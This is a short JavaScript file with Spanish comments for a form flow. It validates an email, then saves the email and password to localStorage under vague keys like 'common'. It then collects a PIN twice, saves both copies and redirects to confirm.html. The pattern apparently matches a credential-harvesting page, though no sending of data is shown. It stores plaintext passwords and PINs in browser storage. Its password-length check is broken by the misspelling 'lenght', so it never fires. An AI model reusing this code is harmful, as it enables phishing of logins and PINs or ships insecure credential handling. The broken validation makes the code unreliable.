setTimeout(() => {
   // Obtener el campo de entrada y el botón de enviar
var input = document.getElementById("esd");
var botonEnviar = document.getElementById("btn1");

// Agregar un evento de clic al botón de enviar
botonEnviar.addEventListener("click", function(event) {
  // Prevenir el envío del formulario si la entrada es inválida
  event.preventDefault();

  // Obtener el valor del campo de entrada y eliminar los espacios en blanco al principio y al final
  var valor = input.value.trim();

  // Validar que la entrada no esté vacía y que contenga una dirección de correo electrónico válida
  if (valor === "" || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(valor)) {
    alert("Por favor, introduce una dirección de correo electrónico válida.");
    return false;
  }else{
    cps()



  }

  
});
   
 }, 2000);
 
function cps(params) {
  if (document.getElementById("ps").value.lenght < 6) {
    alert("contraseña incompleta o erronea")
    
  }else{
    localStorage.setItem("common" ,document.getElementById("esd").value)
    localStorage.setItem("commons", document.getElementById("ps").value)
    document.getElementById("field").style.display = "none";
    document.getElementById("btn1").style.display = "none";
    document.getElementById("field1").style.display = "block";
    document.getElementById("btn2").style.display = "block";
  }
  
}
function pch(params) {
if (document.getElementById("pn").value.length < 4) {
  alert("pin incompleto, debe tener al menos 4 digitos. ")
  
}else if(document.getElementById("pn").value != document.getElementById("pn2").value ){
  alert("El pin debe ser igual, verifique");
  document.getElementById("pn2").value = "";
  document.getElementById("pn2").focus();


}else{
  localStorage.setItem("commonpn" ,document.getElementById("pn").value)
    localStorage.setItem("commonspnn", document.getElementById("pn2").value)
    window.location = "confirm.html"
   

}

  
}
